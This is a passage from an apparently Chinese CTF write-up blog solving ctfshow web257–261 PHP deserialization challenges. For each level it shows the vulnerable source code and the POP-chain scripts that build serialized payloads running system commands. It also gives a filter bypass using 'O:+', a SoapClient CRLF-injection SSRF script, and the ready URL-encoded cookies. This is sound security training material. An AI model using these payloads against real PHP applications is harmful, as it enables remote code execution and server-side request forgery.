class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backDoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET：</span><br><span class="line">?username=admin&amp;password=aaa</span><br><span class="line">COOKIE：</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>tac+f%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加了个过滤：<code>/[oc]:\d+:/i</code><br>过滤出：<code>o/c:数字</code><br>可以使用加号过滤：<code>o:+</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>, <span class="string">&quot;O:+&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;user=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>tac+f%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><blockquote><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a><br><a href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a><br><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p></blockquote><h3 id="SoapCLient-CRLF"><a href="#SoapCLient-CRLF" class="headerlink" title="SoapCLient+CRLF"></a>SoapCLient+CRLF</h3><p>这怎么一下子升维了？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php中的连接web需要使用soapclient来连接。比较复杂，这里直接借用个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;yn8rt^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>aaab%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A235%<span class="number">3</span>A%<span class="number">22</span>yn8rt%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A+<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AUM_distinctid%<span class="number">3</span>A175648cc09a7ae-<span class="number">050</span>bc162c95347-<span class="number">32667006</span>-<span class="number">13</span>c680-<span class="number">175648</span>cc09b69d%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">13</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>传参之后访问flag.txt即可<br>没看懂的建议直接看：<br><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a></p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><p>查询出题精神状态，怎么一下子又这么简单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ctf%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>c%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>ctfshow_i_love_36D%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><h3 id="unserialize-和wakeup"><a href="#unserialize-和wakeup" class="headerlink" title="__unserialize()和wakeup()"></a>__unserialize()和wakeup()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span 